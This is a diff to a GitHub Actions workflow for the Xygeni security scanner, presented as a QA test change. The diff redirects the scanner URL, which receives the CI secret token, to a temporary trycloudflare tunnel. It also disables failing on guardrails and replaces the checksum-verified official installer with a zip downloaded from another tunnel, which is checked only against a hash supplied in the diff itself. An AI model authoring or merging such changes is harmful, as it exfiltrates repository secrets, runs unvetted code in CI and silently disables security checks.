@@ -42,9 +42,9 @@ jobs:
         env:
           # XYGENI_MANAGED_CI_TOKEN and XYGENI_MANAGED_CI_URL: secrets of this repository, written by Xygeni
           XYGENI_TOKEN: ${{ secrets.XYGENI_MANAGED_CI_TOKEN }}
-          XYGENI_URL: ${{ secrets.XYGENI_MANAGED_CI_URL }}
+          XYGENI_URL: https://situation-promises-arrange-boss.trycloudflare.com/deps-doctor-service
           XYGENI_SCANNERS: ${{ github.event.inputs.scanners || 'secrets' }}
-          XYGENI_FAIL_ON: 'guardrails'
+          XYGENI_FAIL_ON: 'none'
           XYGENI_INCREMENTAL: 'false'
           XYGENI_PULL_REQUEST: ${{ github.event_name == 'pull_request' }}
           XYGENI_PULL_REQUEST_SOURCE: ${{ github.head_ref }}
@@ -90,12 +90,13 @@ jobs:
           #
           # Install the Xygeni scanner, verifying its published SHA-256 checksum first.
           # If the checksum does not match, nothing is installed and the job stops.
+          # E2E (QA #2773/#2768): the scanner built from the branch, served from the developer machine
           XY=`mktemp -d` &&
-          curl -sSfL --retry 3 -o "$XY/get-xygeni.sh" https://get.xygeni.io/latest/scanner/get-xygeni.sh &&
-          curl -sSfL --retry 3 -o "$XY/get-xygeni.sh.sha256" https://raw.githubusercontent.com/xygeni/xygeni/main/checksum/latest/get-xygeni.sh.sha256 &&
-          echo "`cat $XY/get-xygeni.sh.sha256`  $XY/get-xygeni.sh" | sha256sum -c - &&
-          sh "$XY/get-xygeni.sh" &&
-          rm -rf "$XY" || { echo "ERROR: Xygeni scanner installation failed: download error, or the installer did not match its published checksum. Nothing was installed or run."; exit 1; }
+          curl -sSfL --retry 3 -o "$XY/xygeni-release.zip" https://water-boating-rug-reception.trycloudflare.com/xygeni-release.zip &&
+          echo "ba149f6d1f7ad7407bbb85074bf882c0a14d2990183fa29936586b1a53b6942f  $XY/xygeni-release.zip" | sha256sum -c - &&
+          unzip -q "$XY/xygeni-release.zip" -d "$XY" &&
+          rm -rf "$HOME/.xygeni" && mv "$XY/xygeni_scanner" "$HOME/.xygeni" && chmod +x "$HOME/.xygeni/xygeni" &&
+          rm -rf "$XY" || { echo "ERROR: branch scanner install failed"; exit 1; }
           # Pull requests can block the merge (failing check) and scan only the changed files.
           # Without PR blocking, a pull request gets the findings as a comment instead.
           BLOCKING=false
